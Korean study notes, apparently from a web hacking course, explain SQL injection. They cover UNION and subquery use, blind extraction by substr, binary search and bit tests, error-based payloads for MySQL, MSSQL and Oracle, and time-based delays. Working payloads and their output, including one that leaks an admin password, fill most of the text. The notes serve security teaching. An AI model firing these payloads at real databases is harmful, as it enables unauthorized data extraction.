# Advanced Web Hacking  
보호기법이 적용된 서비스를 분석하고, 우회하여 공격하는 실습  
웹 서비스를 진단하면서 유용하게 사용할 수 있는 도구 소개  

## SQL  
SQL에서는 Data Definition Language(DDL), Data Manipulation Language(DML), Data Control Language(DCL) 총 세 가지 질의 언어 제공  

### Background: Data Manipulation Language(DML). 
데이터베이스에서 데이터를 조회, 추가, 삭제, 수정을 수행하는 구문  
중첩 구문을 쓸 수 있음을 잊지 말자!  
* SELECT  
데이터 조회하는 구문  
* INSERT  
데이터 추가하는 구문  
* UPDATE  
데이터 수정하는 구문  
* DELETE  
데이터 삭제하는 구문  

### Background: SQL Features  
여러 개의 쿼리를 사용하여 데이터를 검색하는 방법, 애플리케이션이 반환하는 결과값을 통해 데이터를 유추하는 방법  
#### **UNION**  
다수의 SELECT 구문의 결과를 결합하는 절  
1. 이전 SELECT 구문과 UNION을 사용한 구문의 실행 결과 중 컬럼의 갯수가 같아야 함  
2. 특정 DBMS에서는 이전 SELECT 구문과 UNION을 사용한 구문의 컬럼 타입(데이터 타입)이 같아야 함.  
```
mysql> SELECT * FROM UserTable UNION SELECT "DreamHack", "DreamHack PW";
/*
+-----------+--------------+
| username  | password     |
+-----------+--------------+
| admin     | admin        |
| guest     | guest        |
| DreamHack | DreamHack PW |
+-----------+--------------+
3 rows in set (0.01 sec)
*/
```  

#### **Subquery**  
한 쿼리 내에 또 다른 쿼리를 사용하는 것 의미  
쿼리 내에서 괄호 안에 구문 삽입해야함. SELECT 구문만 사용 가능  

공격자는 서브 쿼리를 통해 쿼리가 접근하는 테이블이 아닌 다른 테이블에 접근 가능  
SELECT 구문을 사용하지 않는 쿼리문에서 SQL Injection 취약점이 발생할 때 SELECT 구문을 사용할 수 있음  

1. COLUMNS 절에 서브쿼리  
SELECT 구문의 컬럼 절에서 서브쿼리 사용할 때,  
단일 행(Single Row)과 단일 컬럼(Single Column)이 반환되도록 해야함  
```
mysql> SELECT 1,2,3,(SELECT 456); 
/*
+---+---+---+--------------+
| 1 | 2 | 3 | (SELECT 456) |
+---+---+---+--------------+
| 1 | 2 | 3 |          456 |
+---+---+---+--------------+
1 row in set (0.00 sec)
*/
```  

2. FROM 절에 서브쿼리  
인라인 뷰(Inline View)라고 함  
다중 행(Multiple Row)과 다중 컬럼(Multiple Column) 결과를 반환할 수 있음  
```
mysql> SELECT * FROM (SELECT *, 1234 FROM users) as u;
/*
+----------+------+
| username | 1234 |
+----------+------+
| admin    | 1234 |
| guest    | 1234 |
+----------+------+
2 rows in set (0.00 sec)
*/
```  

3. WHERE 절에 서브쿼리  
다중 행 결과를 반환하는 쿼리문 실행 가능  
```
mysql> SELECT * FROM users WHERE username IN (SELECT "admin" UNION SELECT "guest");
/*
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin    |
| guest    | guest    |
+----------+----------+
2 rows in set (0.00 sec)
*/
```  

#### **Application Logic**  
SQL Injection은 애플리케이션 내부에서 사용하는 데이터베이스의 데이터를 조작하는 기법  
쿼리의 실행 결과가 애플리케이션에서 보여지지 않는다면 공격자는 데이터베이스의 정보를 추측하기 어려움  
그러나 데이터 베이스 결과에 따라 어플리케이션은 각기 다른 기능을 수행하므로  
-> 공격자는 참과 거짓을 구분하여 공격을 수행할 수 있음.  

* SQL에서는 IF 문을 사용해 비교 구문 만들 수 있음  
해당 구문을 통해 관리자의 계정의 비밀번호를 한 글자씩 알아낼 수 있음.  
```substr``` 함수 이용  
> ```UNION SELECT IF(substr(password,1,1) ='B', 'admin', 'not admin') from users where username='admin' -- ```  
> if ( 조건문, 참일때 값, 거짓일때 값); 문제에서 admin이 select 되면 true 리턴하게 때문에 참일 때 값을 어쨌든 admin을 준 것  

## ExploitTech: Blind SQL Injection Advanced  
* 해당 공격 기법은 임의 데이터를 알아내기 위한 일련의 방법으로 수많은 쿼리 전송이 요구됨  
* 방화벽에 의해 접속 IP가 차단될 수 있음  
* 알아내려는 데이터의 길이가 길면 길수록 실행해야하는 쿼리 늘어남, 공격에 들이는 시간 길어짐  

내용을 효율적으로 알아내는 방법. 즉, 시간 복잡도를 낮추는 방법  

### Binary Serach  
이미 정렬된 리스트에서 임의의 값을 효율적으로 찾기 위한 알고리즘  
1. 범위 지정  
범위의 중간값 지정  
2. 범위 조절  
중간 값보다 큰지 작은지에 따라 해당 중간값으로 범위가 조절됨. 이 과정 반복  

* 아스키에서 출력 가능한 문자의 범위는 32~126  
ex) 패스워드 첫번째 바이트가 79보다 큰값인지 확인  
```select * from users where username='admin' and ascii(substr(password, 1, 1))>79;```. 

### Bit 연산  
ASCII는 0부터 127범위의 문자 표현, 즉 7개의 비트를 통해 하나의 문자를 나타낼 수 있음  
하나의 비트는 0과 1로 이루어져 있으니 7개의 비트에 대해 0,1인지 비교하면 총 7번의 쿼리로 임의 데이터의 한 바이트를 알아낼 수 있음~~(꼭 이래야만해?)~~  
MySQL에서 숫자를 비트 형태로 변환하는 **bin**함수 제공함  
```
mysql> SELECT bin(ord('A'));
+---------------+
| bin(ord('A')) |
+---------------+
| 1000001       |
+---------------+
1 row in set (0.00 sec)
```  

* 비트 연산을 통한 Blind SQL Injection 예시  
```select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;```  

## ExploitTech: Error & Time based SQL Injection  
쿼리 결과를 애플리케이션 기능에서 출력하지 않는 경우 사용  
취약점 발생 형태는 같으나 공격 성공 여부를 어떻게 판단하느냐에 따라 명칭 구분  

### Error based SQl Injection  
임의로 에러를 발생시켜 데이터베이스 및 운영체제의 정보를 획득하는 공격 기법  
Flask: Debug 모드 활성화 -> 오류가 발생할 때 발생 원인 출력. 공격자는 오류 메세지를 통해 공격에 필요한 다양한 정보 수집, 원하는 데이터 획득  
에러메세지(예외 처리)와 같이 쿼리 실행 결과를 직접 노출하지는 않지만 중요한 정보를 노출하는 방법들이 존재  

애플리케이션에서 발생하는 에러를 이용해 공격하려 한다면 문법에러와 같이 DBMS에서 쿼리가 실행되기 전에 발생하는 에러가 아닌  
런타임(Runtime) 즉, 쿼리가 실행되고 나서 발생하는 에러가 필요  

#### extractvalue 함수(mysql)  
첫번째 인자로 전달된 XML 데이터에서 두번째 인자인 XPATH 식을 통해 데이터 추출  
해당 함수를 응용해 사용할 경우 데이터베이스의 정보 추출할 수 있음  
해당 쿼리 에러 메세지에 운영체제에 대한 정보가 포함되어 있음. 공격자는 해당 정보를 통해 1-day 또는 0-day 공격 통해 서버 장악 가능.  

```
mysql> SELECT extractvalue('<a>test</a> <b>abcd</b>', '/a');
+-----------------------------------------------+
| extractvalue('<a>test</a> <b>abcd</b>', '/a') |
+-----------------------------------------------+
| test                                          |
+-----------------------------------------------+
1 row in set (0.00 sec)
```  
* a 다음에 단어인 test가 출력  

```
mysql> SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));
ERROR 1105 (HY000): XPATH syntax error: ':Th1s_1s_admin_PASSW@rd'
```  

DBMS 별 Error based SQLI 통해 공격하는 방법  
* MySQL  
```
SELECT updatexml(null,concat(0x0a,version()),null);
/*
ERROR 1105 (HY000): XPATH syntax error: '
5.7.29-0ubuntu0.16.04.1-log'
*/
```  

```
SELECT extractvalue(1,concat(0x3a,version()));
/*
ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
*/
```  

```
SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
/*
ERROR 1062 (23000): Duplicate entry '5.7.29-0ubuntu0.16.04.1-log:1' for key '<group_key>'
*/
```  

* MSSQL  
```
SELECT convert(int,@@version);
SELECT cast((SELECT @@version) as int);
/*
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2014 - 12.0.2000.8 (Intel X86) 
	Feb 20 2014 19:20:46 
	Copyright (c) Microsoft Corporation
	Express Edition on Windows NT 6.3 <X64> (Build 9600: ) (WOW64) (Hypervisor)
' to data type int.
*/
```  

* Oracle  
```
SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual;
/*
ORA-20000: Oracle Text error:
DRG-11701: thesaurus Oracle Database 18c Express Edition Release 18.0.0.0.0 - Production does not exist
ORA-06512: at "CTXSYS.DRUE", line 183
ORA-06512: at "CTXSYS.DRITHSX", line 555
ORA-06512: at line 1
*/
```  

### Error based Blind SQl Injection  
Blind SQLI + Error based SQLI  
임의로 에러 발생시키고 참/거짓 판단해 데이터 추출  

Error based SQLI: 에러 메세지를 통해 출력된 데이터로 정보 수집해 출력값에 영향  
Error based Blind SQLI: 에러 발행 여부만을 필요  

ex) MySQL Double 자료형 최댓값을 초과해 에러 발생 시킴. 서버가 반환하는 HTTP 상태 코드, 애플리케이션의 응답 차이를 통해 에러 발생 여부 확인, 참/거짓 여부 판단  

### Short-circuit evaluation  
로직 연산의 원리를 이용해 공격하는 방법  
ex) A AND B -> 두 식의 결과가 모두 참이 반환돼야 전체 식이 참이 됨. 하나라도 거짓을 반환하면 B 연산을 실행하지 않는다는 점을 이용해 공격  

* AND 연산자 이용한 공격 방법  
```
mysql> SELECT 0 AND SLEEP(1);
+----------------+
| 0 AND SLEEP(1) |
+----------------+
|              0 |
+----------------+
1 row in set (0.00 sec)
mysql> SELECT 1 AND SLEEP(10);
+-----------------+
| 1 AND SLEEP(10) |
+-----------------+
|               0 |
+-----------------+
1 row in set (10.04 sec)
```  
처음 식이 거짓인 경우 SLEEP 실행 안되고 처음 식이 참이면 SLEEP 실행됨  

* OR 연산자 이용한 공격 방법  
```
mysql> SELECT 1=1 or 9e307*2;
+----------------+
| 1=1 or 9e307*2 |
+----------------+
|              1 |
+----------------+
1 row in set (0.00 sec)
mysql> SELECT 1=0 or 9e307*2;
ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'
```  
처음 식이 참이면 뒤따라오는 식의 결과에 영향을 받지 않는다는 점 이용해 공격  

### Time based SQl Injection  
시간 지연을 이용해 쿼리의 참/거짓 여부 판단  
시간 지연 시키는 방법: DBMS에서 제공되는 함수 또는 시간이 많이 소요되는 연산을 수행하는 heavy query를 사용하는 방법  

* MySQL  
```
/* SLEEP(duration) */
mysql> SELECT SLEEP(1);
+----------+
| SLEEP(1) |
+----------+
|        0 |
+----------+
1 row in set (1.00 sec)
```  
sleep 함수  

```
/* BENCHMARK(count, expr) */
mysql> SELECT BENCHMARK(40000000,SHA1(1));
+-----------------------------+
| BENCHMARK(40000000,SHA1(1)) |
+-----------------------------+
|                           0 |
+-----------------------------+
1 row in set (10.78 sec)
```  
benchmark 함수

```
mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
+----------+
| heavy    |
+----------+
| 24897088 |
+----------+
1 row in set (1.41 sec)
mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B) as heavy;
+-------+
| heavy |
+-------+
| 85264 |
+-------+
1 row in set (0.01 sec)
mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
+----------+
| heavy    |
+----------+
| 24897088 |
+----------+
1 row in set (1.38 sec)
```  
heavy query  

* MSSQL  
```
/* waitfor delay 'time_to_pass'; */
> SELECT '' if((select 'abc')='abc') waitfor delay '0:0:1';
Execution time: 1,02 sec, rows selected: 0, rows affected: 0, absolute service time: 1,17 sec, absolute service time: 1,16 sec
```  
waitfor  

```
select (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F)
/*
Execution time: 6,36 sec, rows selected: 1, rows affected: 0, absolute service time: 6,53 sec, absolute service time: 6,53 sec
*/
```  
heavy query

* SQLite  
```
/* LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) */
sqlite> .timer ON
sqlite> SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1500000000/2))));
0
Run Time: real 9.740 user 7.983349 sys 1.743972
```  
heavy query  






